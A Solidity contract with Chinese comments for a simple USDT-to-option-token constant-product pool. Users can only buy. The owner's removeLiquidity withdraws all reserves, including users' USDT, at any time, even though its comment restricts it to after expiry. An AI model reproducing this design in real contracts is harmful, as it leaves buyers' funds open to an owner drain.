// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/// @title OptionPool - 期权 Token 与 USDT 的简易交易池
/// @notice 使用恒定乘积做市商 (x*y=k) 模型，让用户用 USDT 购买期权 Token
/// @dev 项目方初始注入流动性，设定较低的初始价格吸引用户购买
contract OptionPool is Ownable {
    IERC20 public immutable optionToken;
    IERC20 public immutable usdt;

    uint256 public reserveOption;
    uint256 public reserveUSDT;

    uint256 public totalLiquidity; // LP token 总量（简化：即为 option+usdt 的几何平均）

    event LiquidityAdded(address indexed provider, uint256 optionAmount, uint256 usdtAmount);
    event Swapped(address indexed buyer, uint256 usdtIn, uint256 optionOut);
    event LiquidityRemoved(address indexed provider, uint256 optionAmount, uint256 usdtAmount);

    constructor(address _optionToken, address _usdt) Ownable(msg.sender) {
        require(_optionToken != address(0) && _usdt != address(0), "Zero address");
        optionToken = IERC20(_optionToken);
        usdt = IERC20(_usdt);
    }

    /// @notice 【项目方】添加初始流动性，设定期权 Token 的初始价格
    /// @param optionAmount 期权 Token 数量
    /// @param usdtAmount USDT 数量
    /// @dev 首次添加决定初始价格 = usdtAmount / optionAmount
    function addLiquidity(uint256 optionAmount, uint256 usdtAmount) external onlyOwner {
        require(optionAmount > 0 && usdtAmount > 0, "Invalid amounts");
        require(
            optionToken.transferFrom(msg.sender, address(this), optionAmount),
            "Option transfer failed"
        );
        require(
            usdt.transferFrom(msg.sender, address(this), usdtAmount),
            "USDT transfer failed"
        );

        reserveOption += optionAmount;
        reserveUSDT += usdtAmount;

        // 简易 LP 追踪（项目方独占 LP）
        if (totalLiquidity == 0) {
            totalLiquidity = optionAmount + usdtAmount; // 简化 LP 计数
        } else {
            totalLiquidity += optionAmount + usdtAmount;
        }

        emit LiquidityAdded(msg.sender, optionAmount, usdtAmount);
    }

    /// @notice 【用户】用 USDT 购买期权 Token
    /// @param usdtIn 支付的 USDT 数量
    /// @param minOptionOut 最小接受的期权 Token 数量（滑点保护）
    /// @return optionOut 实际获得的期权 Token 数量
    /// @dev 恒定乘积: (reserveOption - optionOut) * (reserveUSDT + usdtIn) = reserveOption * reserveUSDT
    function buyOptions(uint256 usdtIn, uint256 minOptionOut) external returns (uint256 optionOut) {
        require(usdtIn > 0, "usdtIn must be > 0");
        require(reserveOption > 0 && reserveUSDT > 0, "No liquidity");

        // 收取 0.3% 手续费
        uint256 usdtInWithFee = (usdtIn * 997) / 1000;
        optionOut = (reserveOption * usdtInWithFee) / (reserveUSDT + usdtInWithFee);
        require(optionOut >= minOptionOut, "Slippage too high");
        require(optionOut > 0 && optionOut <= reserveOption, "Invalid output");

        require(usdt.transferFrom(msg.sender, address(this), usdtIn), "USDT transfer failed");
        require(optionToken.transfer(msg.sender, optionOut), "Option transfer failed");

        reserveUSDT += usdtIn;
        reserveOption -= optionOut;

        emit Swapped(msg.sender, usdtIn, optionOut);
    }

    /// @notice 查询当前兑换率（1 USDT 能换多少 option token）
    function getOptionPrice() external view returns (uint256) {
        if (reserveUSDT == 0 || reserveOption == 0) return 0;
        // 返回 1 USDT (10^6, USDT 6位小数) 能换多少 option token (18位小数)
        // optionOut = reserveOption * usdtIn / reserveUSDT
        return (reserveOption * 1e6) / reserveUSDT;
    }

    /// @notice 【项目方】移除流动性（仅在到期后，池子关闭时使用）
    function removeLiquidity() external onlyOwner {
        require(reserveOption > 0 || reserveUSDT > 0, "No liquidity");

        uint256 optAmt = reserveOption;
        uint256 usdtAmt = reserveUSDT;

        reserveOption = 0;
        reserveUSDT = 0;
        totalLiquidity = 0;

        if (optAmt > 0) {
            require(optionToken.transfer(msg.sender, optAmt), "Option return failed");
        }
        if (usdtAmt > 0) {
            require(usdt.transfer(msg.sender, usdtAmt), "USDT return failed");
        }

        emit LiquidityRemoved(msg.sender, optAmt, usdtAmt);
    }
}
